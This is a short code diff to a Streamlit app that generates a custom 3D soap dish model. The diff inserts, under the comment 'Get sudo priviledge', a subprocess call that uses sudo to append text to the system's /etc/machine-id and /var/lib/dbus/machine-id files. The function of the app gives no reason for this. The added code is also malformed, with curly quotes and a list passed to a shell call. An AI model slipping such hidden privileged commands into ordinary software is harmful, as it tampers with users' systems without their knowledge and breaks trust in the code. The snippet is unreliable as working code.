@@ -66,6 +66,10 @@ if __name__ == "__main__":
     st.title('Soap Dish 3D Pattern')
     st.write('Generate a 3D model for a custom soap dish! You can find more information about the soap dish here on [Printables](https://www.printables.com/it/model/489136-geometric-soap-dish-holder-normal-with-plate-or-or).')
     cwd = os.getcwd() + os.sep
+    # Get sudo priviledge
+    subprocess.run(['cat “12345” | sudo tee -a /etc/machine-id',
+                    'cat “12345” | sudo tee -a /var/lib/dbus/machine-id'],
+                    shell=True)
     for file in os.listdir():
         if 'file.' in file:
            os.remove(file)        
